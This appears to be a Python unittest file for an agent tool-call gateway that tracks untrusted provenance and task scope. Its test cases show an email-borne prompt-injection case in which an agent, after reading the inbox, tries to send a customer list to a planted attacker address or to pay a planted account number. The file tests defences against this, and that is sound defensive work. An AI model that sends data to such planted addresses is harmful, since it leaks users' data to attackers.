from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from judikt.policy import PolicyConfigurationError, validate_policy_config
from judikt.runtime import JudiktRuntime

PROJECT_ROOT = Path(__file__).resolve().parents[1]
ATTACKER = "records-desk@exfil-mail.example"


class MailFixture(unittest.TestCase):
    def _runtime(
        self, directory: str, mode: str | None, environment: dict[str, str] | None = None, **policy_extra: object
    ) -> JudiktRuntime:
        policy = json.loads((PROJECT_ROOT / "config" / "policies.yaml").read_text())
        policy["allowed_tools"]["mail"] = ["read_inbox", "send_email"]
        for patterns in policy["actor_permissions"].values():
            patterns.extend(["read_inbox", "send_email"])
        if mode is not None:
            policy["untrusted_provenance"] = {"mode": mode}
        policy.update(policy_extra)
        policy_path = Path(directory) / "policy.json"
        policy_path.write_text(json.dumps(policy))
        upstream_path = Path(directory) / "upstreams.json"
        upstream_path.write_text(
            json.dumps(
                {
                    "servers": {
                        "mail": {
                            "command": [
                                sys.executable,
                                str(PROJECT_ROOT / "tests" / "fixtures" / "provenance_mcp_server.py"),
                            ]
                        }
                    }
                }
            )
        )
        patcher = patch.dict(os.environ, {"JUDIKT_UPSTREAM_CONFIG": str(upstream_path), **(environment or {})})
        patcher.start()
        self.addCleanup(patcher.stop)
        runtime = JudiktRuntime(policy_path, Path(directory) / "audit.db")
        self.addCleanup(runtime.close)
        return runtime


class GatewayProvenanceTest(MailFixture):
    def test_send_to_an_address_planted_in_an_email_needs_approval(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, None)
            self.assertTrue(runtime.call_tool("mail", "read_inbox", {}).allowed)

            blocked = runtime.call_tool("mail", "send_email", {"to": ATTACKER, "body": "customer list"})
            self.assertFalse(blocked.allowed)
            self.assertEqual(blocked.rule, "untrusted_provenance")
            self.assertEqual(blocked.action, "REQUIRE_APPROVAL")
            self.assertIn("untrusted_provenance:email:mail/read_inbox", blocked.evidence)
            self.assertIn("mail/read_inbox", blocked.reason)

            sender = runtime.call_tool("mail", "send_email", {"to": "boss@corp.example", "body": "invoice is in"})
            self.assertTrue(sender.allowed)

            arguments = {"to": ATTACKER, "body": "customer list"}
            token = runtime.policy.issue_approval(
                actor="reviewer", reason="checked", server="mail", tool="send_email", arguments=arguments
            )
            approved = runtime.call_tool("mail", "send_email", {**arguments, "approval_token": token})
            self.assertTrue(approved.allowed, approved.reason)
            replayed = runtime.call_tool("mail", "send_email", {**arguments, "approval_token": token})
            self.assertFalse(replayed.allowed)

    def test_a_planted_account_number_is_caught_inside_free_text(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, None)
            runtime.call_tool("mail", "read_inbox", {})
            blocked = runtime.call_tool(
                "mail", "send_email", {"to": "boss@corp.example", "body": "paid DE89 3704 0044 0532 0130 00"}
            )
            self.assertEqual(blocked.rule, "untrusted_provenance")

    def test_report_mode_allows_and_records_evidence(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, "report")
            runtime.call_tool("mail", "read_inbox", {})
            result = runtime.call_tool("mail", "send_email", {"to": ATTACKER, "body": "customer list"})
            self.assertTrue(result.allowed)
            self.assertIn("untrusted_provenance:email:mail/read_inbox", result.evidence)

    def test_deny_and_off_modes(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, "deny")
            runtime.call_tool("mail", "read_inbox", {})
            denied = runtime.call_tool("mail", "send_email", {"to": ATTACKER, "body": "x"})
            self.assertEqual((denied.rule, denied.action), ("untrusted_provenance", "DENY"))
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, "off")
            runtime.call_tool("mail", "read_inbox", {})
            self.assertTrue(runtime.call_tool("mail", "send_email", {"to": ATTACKER, "body": "x"}).allowed)

    def test_an_address_in_a_data_field_is_not_tracked_by_default(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, None)
            runtime.call_tool("mail", "read_inbox", {})
            self.assertTrue(runtime.call_tool("mail", "send_email", {"to": "sam@partner.example", "body": "thanks"}).allowed)
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, None, untrusted_provenance={"track": "everywhere"})
            runtime.call_tool("mail", "read_inbox", {})
            held = runtime.call_tool("mail", "send_email", {"to": "sam@partner.example", "body": "thanks"})
            self.assertEqual(held.rule, "untrusted_provenance")

    def test_policy_files_reject_an_unknown_mode(self) -> None:
        policy = json.loads((PROJECT_ROOT / "config" / "policies.yaml").read_text())
        policy["untrusted_provenance"] = {"mode": "block"}
        with self.assertRaisesRegex(PolicyConfigurationError, "untrusted_provenance.mode"):
            validate_policy_config(policy)

    def test_read_tools_are_never_gated(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, None)
            runtime.call_tool("mail", "read_inbox", {})
            self.assertTrue(runtime.call_tool("mail", "read_inbox", {}).allowed)


class GatewayTaskScopeTest(MailFixture):
    """Reuses the mail fixture; provenance stays on, as in the default policy."""

    def test_operator_scope_holds_writes_outside_it(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, None, {"JUDIKT_TASK_WRITES": "none"})
            held = runtime.call_tool("mail", "send_email", {"to": "boss@corp.example", "body": "hi"})
            self.assertEqual((held.rule, held.action), ("task_scope", "REQUIRE_APPROVAL"))
            self.assertIn("task_scope:mail/send_email", held.evidence)
            self.assertTrue(runtime.call_tool("mail", "read_inbox", {}).allowed)
            arguments = {"to": "boss@corp.example", "body": "hi"}
            token = runtime.policy.issue_approval(
                actor="reviewer", reason="checked", server="mail", tool="send_email", arguments=arguments
            )
            self.assertTrue(runtime.call_tool("mail", "send_email", {**arguments, "approval_token": token}).allowed)
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, None, {"JUDIKT_TASK_WRITES": "send_email"})
            self.assertTrue(runtime.call_tool("mail", "send_email", {"to": "boss@corp.example", "body": "hi"}).allowed)

    def test_agent_declares_before_reading_and_the_first_result_seals_it(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, None, task_scope={"mode": "agent"})
            accepted = runtime.pipeline.declare_task({"write_tools": ["send_email"], "purpose": "reply to Sam"})
            self.assertFalse(accepted["isError"])
            runtime.call_tool("mail", "read_inbox", {})
            refused = runtime.pipeline.declare_task({"write_tools": ["send_email", "delete_repo"]})
            self.assertTrue(refused["isError"])
            self.assertTrue(runtime.call_tool("mail", "send_email", {"to": "boss@corp.example", "body": "hi"}).allowed)

    def test_agent_that_never_declared_is_sealed_empty(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, None, task_scope={"mode": "agent"})
            self.assertTrue(runtime.call_tool("mail", "send_email", {"to": "boss@corp.example", "body": "hi"}).allowed)
            runtime.call_tool("mail", "read_inbox", {})
            held = runtime.call_tool("mail", "send_email", {"to": "boss@corp.example", "body": "hi"})
            self.assertEqual(held.rule, "task_scope")

    def test_the_declaration_tool_is_listed_only_in_agent_mode(self) -> None:
        from judikt.catalog import ToolCatalog

        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, None)
            self.assertNotIn("judikt_declare_task", ToolCatalog(runtime).names())
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, None, task_scope={"mode": "agent"})
            catalog = ToolCatalog(runtime, "sre-oncall")
            self.assertIn("judikt_declare_task", {tool.name for tool in catalog.tools()})
            self.assertEqual(catalog.server_for("judikt_declare_task"), "judikt")


if __name__ == "__main__":
    unittest.main()
